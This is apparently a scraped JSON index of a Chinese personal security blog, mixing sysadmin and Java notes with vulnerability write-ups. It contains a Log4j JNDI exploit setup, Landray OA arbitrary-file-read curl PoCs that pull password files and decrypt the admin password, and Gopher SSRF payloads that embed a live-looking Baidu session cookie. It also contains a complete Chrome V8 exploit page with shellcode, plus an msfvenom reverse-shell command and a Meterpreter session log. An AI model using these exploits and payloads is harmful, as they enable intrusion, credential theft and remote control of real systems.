入/出域操作   powershell(管理员)\n打开powershell\n  1 2 3 4  hostname # 查看当前主机名 rename-computer -NewName win10 # win10 更改NetBIOS名 add-computer -domain \u0026#34;域名\u0026#34; -cred \u0026#34;域名\\授权用户\u0026#34; -passthru ;restart-computer remove-computer -credential \u0026#34;域名\\授权用户\u0026#34; -passthru -verbose; restart-computer    win+R 运行 sysdm.cpl  出域\n","description":"","id":28,"section":"blog","tags":null,"title":"AD域环境搭建","uri":"http://crkmythical.github.io/blog/ad%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"content":"编写进度\n   linux如何添加自定义服务-service命令 添加配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14  cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/systemd/system/clash.service [Unit] Description=Clash service After=network.target [Service] Type=simple User=skylee ExecStart=/usr/bin/clash Restart=on-failure RestartPreventExitStatus=23 [Install] WantedBy=multi-user.target   服务操作 1 2 3  systemctl list-units --type=service # 查看已识别的服务 systemctl daemon-reload # 让系统重新读取服务 service \u0026lt;service-name\u0026gt; start/restart/stop   启/禁用开机自启 1  systemctl enable/disable \u0026lt;service-name\u0026gt;   ","description":"","id":29,"section":"blog","tags":null,"title":"linux如何添加自定义服务","uri":"http://crkmythical.github.io/blog/linux%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1/"},{"content":"编写进度\n   ","description":"","id":30,"section":"blog","tags":null,"title":"Confluence-CVE2021-26084","uri":"http://crkmythical.github.io/blog/confluence-cve2021-26084/"},{"content":"编写进度\n   AWS告警通知与Slack集成  前提：Slack channel中已添加AWS Chatbot应用\n 配置AWS SNS服务 配置AWS Chatbot 第7步配置好SNS服务时再进行第八步\n配置AWS Cloudwatch通知服务 测试告警 FAQ 添加了 频道 ID 后，在AWS Chatbot的Channel中显示不出来频道的名字 需在Slack的频道内添加应用 AWS Chatbot\n通过cloudwatch观察发送记录的日志，报错： Encountered error while sending message to Slack: Slack Web API returned unsuccessful response ( ok: false, error code: channel_not_found, full response body: ChatPostMessageResponse(ok=false, warning=null, error=channel_not_found, needed=null, provided=null, deprecatedArgument=null, responseMetadata=null, channel=null, ts=null, message=null)). 需在Slack的频道内添加应用 AWS Chatbot\n","description":"","id":31,"section":"blog","tags":null,"title":"awschatbot_slack集成","uri":"http://crkmythical.github.io/blog/awschatbot-slack%E9%9B%86%E6%88%90/"},{"content":"编写进度\n   Apache-Log4j Apache Log4j 远程代码执行\n 攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响\n 复线步骤 编译exp-修改Log4jRCE.java 1 2 3 4 5 6 7 8 9 10  public class Log4jRCE { static{ try{ String[] cmd={\u0026#34;open\u0026#34;,\u0026#34;/System/Applications/Calculator.app\u0026#34;}; java.lang.Runtime.getRuntime().exec(cmd).waitFor(); }catch (Exception e){ e.printStackTrace(); } } }   python起个本地简易web服务 在target/classes目录下执行 python3 -m http.server 8888\n在本地起一个ldap服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026quot;http://127.0.0.1:8888/#Log4jRCE\u0026quot;\n运行log4j.java程序 临时修复方案： （1）修改jvm参数\n-Dlog4j2.formatMsgNoLookups=true\n（2）修改配置\n在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups=true\n①在jvm启动参数中添加\n-Dlog4j2.formatMsgNoLookups=true\n③项⽬中创建log4j2.component.properties⽂件，⽂件中增加配置log4j2.formatMsgNoLookups=true\nLog4j2 漏洞修复建议\n临时性缓解措施（任选一种，但是注意，只有 \u0026gt;=2.1.0 版本才可以用，老版本不支持这个选项）\n在 jvm 参数中添加 -Dlog4j2.formatMsgNoLookups=true\n系统环境变量中将LOG4J_FORMAT_MSG_NO_LOOKUPS 设置为 true\n创建 log4j2.component.properties 文件，文件中增加配置 log4j2.formatMsgNoLookups=true\n彻底修复漏洞:\n方案一、研发代码修复：升级到官方提供的 log4j-2.15.0-rc2 版本\n方案二、生产环境修复：https://github.com/zhangyoufu/log4j2-without-jndi。（如果不放心网上下载的版本，也可以自己手动解压删除：zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 删除jar包里的这个漏洞相关的class，然后重启服务即可）\n长亭检测工具\n","description":"","id":32,"section":"blog","tags":null,"title":"Apache_Log4j_RCE","uri":"http://crkmythical.github.io/blog/apache-log4j-rce/"},{"content":"编写进度\n   蓝凌OA custom.jsp页面任意文件读取  URI: /sys/ui/extend/varkind/custom.jsp payload:  1 2 3  var={\u0026#34;body\u0026#34;:{\u0026#34;file\u0026#34;:\u0026#34;file:///etc/passwd\u0026#34;}} var={\u0026#34;body\u0026#34;:{\u0026#34;file\u0026#34;:\u0026#34;/WEB-INF/KmssConfig/kmssconfig.properties\u0026#34;}} var={\u0026#34;body\u0026#34;:{\u0026#34;file\u0026#34;:\u0026#34;/WEB-INF/KmssConfig/admin.properties\u0026#34;}}   POC  查看kmssconfig配置文件  1  curl -X POST \u0026#34;http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp\u0026#34; -d \u0026#39;var={\u0026#34;body\u0026#34;:{\u0026#34;file\u0026#34;:\u0026#34;/WEB-INF/KmssConfig/kmssconfig.properties\u0026#34;}}\u0026#39;   查看/admin.do管理员后台密码  1  curl -X POST \u0026#34;http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp\u0026#34; -d \u0026#39;var={\u0026#34;body\u0026#34;:{\u0026#34;file\u0026#34;:\u0026#34;/WEB-INF/KmssConfig/admin.properties\u0026#34;}}\u0026#39;   解密工具 LandrayDES\n1  java -jar LandrayDES-0.0.1-SNAPSHOT-jar-with-dependencies.jar Decrypt admin.do S11E7bclfCnWEz/\\JLVTdUw==   参考\nX凌OA任意文件读取\n","description":"","id":33,"section":"blog","tags":null,"title":"Landray-OA 蓝凌OA custom.jsp页面任意文件读取","uri":"http://crkmythical.github.io/blog/landray-oa/"},{"content":"编写进度\n   Table of Contents  Gopher  发送gopher请求 发送GET请求 发送POST请求    \nGopher gopher://\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/\u0026lt;gopher-path\u0026gt;_[TCP/IP数据] 默认端口70  发起post请求，回车换行需要使用`%0d%0a`，如果多个参数，参数之间的\u0026amp;也需要进行URL编码\ngopher会将后面的数据部分发送给相应的端口，\n这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等\n，同时数据部分必须要进行**URL编码**，这样gopher协议才能正确解析。\n\n发送gopher请求 curl gopher://www.example.com/path/_[file] curl gopher://192.168.43.26:8888/_Hi%0aNewLine%0aThere  \n发送GET请求  GET / HTTP/1.1 Host: baidu.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgS Connection: close   URL全编码1次HTTP请求包\n%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a\n   将URL全编码后的HTTP请求包的字符串附加到`_`后  1 2 3 4 5 6 7 8 9 10 11 12 13  curl -v gopher://127.0.0.1/_%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a ❯ nc -lvv 70 GET / HTTP/1.1 Host: baidu.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgS Connection: close   \n发送POST请求 必须参数`POST`、`Host`、`Content-Type`、`Content-Length`、、\nPOST /v1/pages HTTP/2 Host: content-autofill.googleapis.com X-Goog-Encode-Response-If-Executable: base64 X-Goog-Api-Key: dummytoken X-Client-Data: COrfygE= Sec-Fetch-Site: none Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: empty User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 9 alt=proto    URL全编码HTTP请求包\n  将URL全编码后的HTTP请求包的字符串附加到`_`后\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  curl -v gopher://127.0.0.1/_%50%4f%53%54%20%2f%76%31%2f%70%61%67%65%73%20%48%54%54%50%2f%32%0d%0a%48%6f%73%74%3a%20%63%6f%6e%74%65%6e%74%2d%61%75%74%6f%66%69%6c%6c%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%0d%0a%58%2d%47%6f%6f%67%2d%45%6e%63%6f%64%65%2d%52%65%73%70%6f%6e%73%65%2d%49%66%2d%45%78%65%63%75%74%61%62%6c%65%3a%20%62%61%73%65%36%34%0d%0a%58%2d%47%6f%6f%67%2d%41%70%69%2d%4b%65%79%3a%20%64%75%6d%6d%79%74%6f%6b%65%6e%0d%0a%58%2d%43%6c%69%65%6e%74%2d%44%61%74%61%3a%20%43%4f%72%66%79%67%45%3d%0d%0a%53%65%63%2d%46%65%74%63%68%2d%53%69%74%65%3a%20%6e%6f%6e%65%0d%0a%53%65%63%2d%46%65%74%63%68%2d%4d%6f%64%65%3a%20%6e%6f%2d%63%6f%72%73%0d%0a%53%65%63%2d%46%65%74%63%68%2d%44%65%73%74%3a%20%65%6d%70%74%79%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%61%6c%74%3d%70%72%6f%74%6f ❯ nc -lvv 70 POST /v1/pages HTTP/2 Host: content-autofill.googleapis.com X-Goog-Encode-Response-If-Executable: base64 X-Goog-Api-Key: dummytoken X-Client-Data: COrfygE= Sec-Fetch-Site: none Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: empty User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 9 alt=proto   ","description":"","id":34,"section":"blog","tags":null,"title":"Gopher","uri":"http://crkmythical.github.io/blog/gopher-md/"},{"content":"编写进度\n   exp.html sample 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106  \u0026lt;script\u0026gt; function gc() { for (var i = 0; i \u0026lt; 0x80000; ++i) { var a = new ArrayBuffer(); } } // replace the shellcode with cs\u0026#39;payload generate as c format  let shellcode = [ 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00 ]; var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]); var wasmModule = new WebAssembly.Module(wasmCode); var wasmInstance = new WebAssembly.Instance(wasmModule); var main = wasmInstance.exports.main; var bf = new ArrayBuffer(8); var bfView = new DataView(bf); function fLow(f) { bfView.setFloat64(0, f, true); return (bfView.getUint32(0, true)); } function fHi(f) { bfView.setFloat64(0, f, true); return (bfView.getUint32(4, true)) } function i2f(low, hi) { bfView.setUint32(0, low, true); bfView.setUint32(4, hi, true); return bfView.getFloat64(0, true); } function f2big(f) { bfView.setFloat64(0, f, true); return bfView.getBigUint64(0, true); } function big2f(b) { bfView.setBigUint64(0, b, true); return bfView.getFloat64(0, true); } class LeakArrayBuffer extends ArrayBuffer { constructor(size) { super(size); this.slot = 0xb33f; } } function foo(a) { let x = -1; if (a) x = 0xFFFFFFFF; var arr = new Array(Math.sign(0 - Math.max(0, x, -1))); arr.shift(); let local_arr = Array(2); local_arr[0] = 5.1;//4014666666666666  let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8  arr[0] = 0x1122; return [arr, local_arr, buff]; } for (var i = 0; i \u0026lt; 0x10000; ++i) foo(false); gc(); gc(); [corrput_arr, rwarr, corrupt_buff] = foo(true); corrput_arr[12] = 0x22444; delete corrput_arr; function setbackingStore(hi, low) { rwarr[4] = i2f(fLow(rwarr[4]), hi); rwarr[5] = i2f(low, fHi(rwarr[5])); } function leakObjLow(o) { corrupt_buff.slot = o; return (fLow(rwarr[9]) - 1); } let corrupt_view = new DataView(corrupt_buff); let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff); let idx0Addr = corrupt_buffer_ptr_low - 0x10; let baseAddr = (corrupt_buffer_ptr_low \u0026amp; 0xffff0000) - ((corrupt_buffer_ptr_low \u0026amp; 0xffff0000) % 0x40000) + 0x40000; let delta = baseAddr + 0x1c - idx0Addr; if ((delta % 8) == 0) { let baseIdx = delta / 8; this.base = fLow(rwarr[baseIdx]); } else { let baseIdx = ((delta - (delta % 8)) / 8); this.base = fHi(rwarr[baseIdx]); } let wasmInsAddr = leakObjLow(wasmInstance); setbackingStore(wasmInsAddr, this.base); let code_entry = corrupt_view.getFloat64(13 * 8, true); setbackingStore(fLow(code_entry), fHi(code_entry)); for (let i = 0; i \u0026lt; shellcode.length; i++) { corrupt_view.setUint8(i, shellcode[i]); } main(); \u0026lt;/script\u0026gt;   MSF\n1  msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.43.26 lport=8080 -f csharp \u0026gt; bb.txt   1 2  python -m SimpleHTTPServer 8888 /path/to/chrome.exe -no-sandbox   msf运行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  msf6 \u0026gt; handler -H 192.168.43.26 -P 8080 -p windows/x64/meterpreter/reverse_tcp [*] Payload handler running as background job 0. [*] Started reverse TCP handler on 192.168.43.26:8080 msf6 \u0026gt; [*] Sending stage (200262 bytes) to 192.168.43.26 [*] Meterpreter session 1 opened (192.168.43.26:8080 -\u0026gt; 192.168.43.26:54937) at 2021-04-16 08:52:41 +0800 msf6 \u0026gt; msf6 \u0026gt; jobs Jobs ==== Id Name Payload Payload opts -- ---- ------- ------------ 0 Exploit: multi/handler windows/x64/meterpreter/reverse_tcp tcp://192.168.43.26:8080 msf6 \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x64/windows ETHANHUNTER78BC\\ethan @ ETHANHUNTER78BC 192.168.43.26:8080 -\u0026gt; 192.168.43.26:54937 (10.211.55.3) msf6 \u0026gt; sessions -i 1 [*] Starting interaction with 1... meterpreter \u0026gt;   参考：\nCobalt Strike 利用 Chrome 0day 上线 \n","description":"","id":35,"section":"blog","tags":null,"title":"Chrome_0day_RCE_no_sandbox","uri":"http://crkmythical.github.io/blog/chrome-0day-rce-no-sandbox/"},{"content":"编写进度\n   Table of Contents  编程基础概念  数据类型 运算符 控制语句  分支语句 if/switch 循环语句 while/do-while/for 跳转语句 break/continue/return/thow     类  抽象类 重载-Overloading stu instanceof Person 是Java中的二元运算符 反射 线程的五个状态   JVM调优  Debug with jdb  编译 \u0026amp; 运行 jdb命令格式 设置断点 查看线程 单步调试 查看变量 其他      Java 是彻底的、纯粹的面向对象语言，在Java中，一切都是对象，具有封装性、继承性、多态性。\n以类的方式组织代码，以对象的形式封装数据\n 多写(代码),多写(笔记),多写(文章)\n多练(交流),多练(思维),多练(技能)\n多分享(知识)，多提问(怎么了)，多思考(为什么)\n \n编程基础概念 \n数据类型 graph LR dataType[数据类型]--\u0026gt;basic[基础数据类型] dataType--\u0026gt;pointer[引用类型] basic--\u0026gt;character[字符型] basic--\u0026gt; number[数字型] basic--\u0026gt; boolean[布尔型] character--\u0026gt;char[char] number--\u0026gt;byte/short/int/long number--\u0026gt;float/double boolean--\u0026gt;Boolean pointer--\u0026gt;数组/类/接口 pointer--\u0026gt;enum  \n运算符   算术运算符 ： 加、减、乘、除、取余\n  关系运算符 ：不等、相等、大于、小于、大于等于、小于等于\n  逻辑操作服 ：与、或、非、异或\ngraph LR\noperate[运算符]\u0026ndash;\u0026gt;calc[算术运算符]\noperate[运算符]\u0026ndash;\u0026gt;relation[关系运算符]\noperate[运算符]\u0026ndash;\u0026gt;logic[逻辑运算符]\noperate[运算符]\u0026ndash;\u0026gt;bit[位运算符]\ncalc--\u0026gt;calcs[加+ 减- 乘* 除/ 取余%] relation--\u0026gt; relations[不等!= 相等== 大于\u0026gt; 小于\u0026lt; 大于等于\u0026gt;= 小于等于\u0026lt;=] logic--\u0026gt;logics[与and 或or 异或xor 非!] bit--\u0026gt;bits[左移\u0026lt;\u0026lt; \u0026gt;\u0026gt;右移 与\u0026amp; 或I 异或^ 取反]    \n控制语句 一般程序都是顺序执行代码语句的，通过控制语句可改变程序执行顺序\ngraph LR control[控制语句]--\u0026gt;switch control--\u0026gt;loop[循环语句] control--\u0026gt;goto[跳转语句] switch[分支语句]--\u0026gt; if/switch loop--\u0026gt;for/while/do-while goto--\u0026gt;break/continue/return/throw/try-catch  \n分支语句 if/switch \n循环语句 while/do-while/for \n跳转语句 break/continue/return/thow \n类 类加载顺序: 静态代码块-\u0026gt; 匿名代码块-\u0026gt; 构造函数\n类加载过程:\n  类初始化代码：\na. 基类初始化代码\nb. 子类初始化代码\n  基类实例初始化代码、基类构造方法\n  子类初始化代码、子类构造方法\npackage com.example.className;\nimport package1[.package2 \u0026hellip;].(className|);\nimport package1[.package2 \u0026hellip;].(className|);\n[public] 